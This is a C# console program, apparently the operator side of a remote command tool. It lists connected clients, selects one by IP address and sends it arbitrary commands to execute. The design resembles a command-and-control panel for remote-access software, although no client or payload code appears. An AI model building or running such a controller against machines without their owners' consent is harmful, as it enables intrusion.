using System.Net.Sockets;
using System.Net;

namespace Server
{
    class Program
    {
        /*
         ТОДО ЕПТА:
            Fix bugs with output.
            Add more decorations.
         */
        static Socket selectedClient = null;

        static void Main()
        {
            Server server = new Server("127.0.0.1", 6080);
            Thread serverThread = new Thread(server.Start);
            serverThread.Start();

            while (true)
            {
                Console.Write("Enter a command >> ");
                string? command = Console.ReadLine();

                if (command == null)
                {
                    continue;
                }

                if (command.ToLower().Equals("clients"))
                {
                    List<string> clients = server.GetConnectedClients();
                    if (clients.Count != 0)
                    {
                        Console.WriteLine("Connected clients:");
                        foreach (string clientIP in clients)
                        {
                            Console.WriteLine(clientIP);
                        }
                    } else
                    {
                        Console.WriteLine("No connected clients.");
                    }
                    
                }
                else if (command.ToLower().Equals("clear") || command.ToLower().Equals("cls"))
                {
                    Console.Clear();
                }
                else if (command.ToLower().StartsWith("use"))
                {
                    string[] splitted = command.Split(' ');
                    if (splitted.Length != 2)
                    {
                        Console.WriteLine("[!] Specify the command as follows: use 127.0.0.1");
                        continue;
                    }
                    string clientIP = splitted[1];
                    KeyValuePair<Socket, Client> client = server.Clients.FirstOrDefault(c => ((IPEndPoint)c.Key.RemoteEndPoint).Address.ToString() == clientIP);
                    if (client.Value != null)
                    {
                        selectedClient = client.Key;
                        Console.WriteLine($"Selected client: {clientIP}");
                    }
                    else
                    {
                        Console.WriteLine("Client not found.");
                    }
                }
                else if (command.ToLower().Equals("cmd"))
                {
                    if (selectedClient != null)
                    {
                        Console.Write("Enter the command for the client to execute >> ");
                        string clientCommand = Console.ReadLine();
                        server.SendCommand(selectedClient, clientCommand);
                    }
                    else
                    {
                        Console.WriteLine("No client selected. Use the 'use' command to select a client.");
                    }
                }
                else
                {
                    Console.WriteLine("[~] Sorry, I don't know that command. Type 'help' for reference.");
                }
            }

            server.Stop();
        }
    }
}
